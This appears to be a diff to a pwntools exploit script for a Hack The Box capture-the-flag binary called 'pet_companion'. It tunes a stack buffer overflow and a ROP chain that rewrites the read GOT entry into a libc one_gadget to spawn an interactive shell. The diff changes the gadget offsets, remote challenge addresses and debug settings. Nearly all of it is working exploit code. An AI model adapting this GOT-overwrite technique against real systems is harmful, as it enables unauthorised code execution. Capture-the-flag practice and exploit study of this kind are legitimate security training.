@@ -10,8 +10,8 @@ cyclic -l raaa
 
 from pwn import *
 
-#context.arch = 'amd64'
-#context.log_level = 'debug'
+context.arch = 'amd64'
+context.log_level = 'debug'
 
 offset = 72
 
@@ -21,13 +21,13 @@ libc = ELF('./glibc/libc.so.6')
 padding = offset*b'A'
 
 #ip, port='161.35.168.118', 30070
-#ip, port = '94.237.59.34', 59604   #HTB
+#ip, port = '83.136.250.41', 46944   #HTB
 #io = remote(ip,port)
 io = process('./pet_companion')
 #io = gdb.debug('./pet_companion','break main')
 
 #0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
-#0x004005e8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret;
+#0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 
 #ropr void -m 10 #default ropr/ROP_gadget is not enought!!
 #0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
@@ -66,7 +66,9 @@ constraints:
 
 '''
 
-one_gadget = 0x10a2fc
+one_gadget = 0x4f2a5
+#one_gadget = 0x4f302
+#one_gadget = 0x10a2fc
 
 offset = one_gadget - libc.sym['read']
 
@@ -75,6 +77,8 @@ print(hex(offset))
 
 read_got = elf.got['read']  #libc_base + libc.sym['read']
 read_plt = elf.sym['read']
+print(hex(read_got))
+print(hex(read_plt))
 
 rop_chain = p64(0x00000000004004de) + p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
 rop_chain += p64(0x004005e8)
@@ -83,6 +87,7 @@ rop_chain += p64(read_plt)
 
 payload = padding + rop_chain
 
+io.recvuntil('current status:')
 io.sendline(payload)
 io.interactive()
 
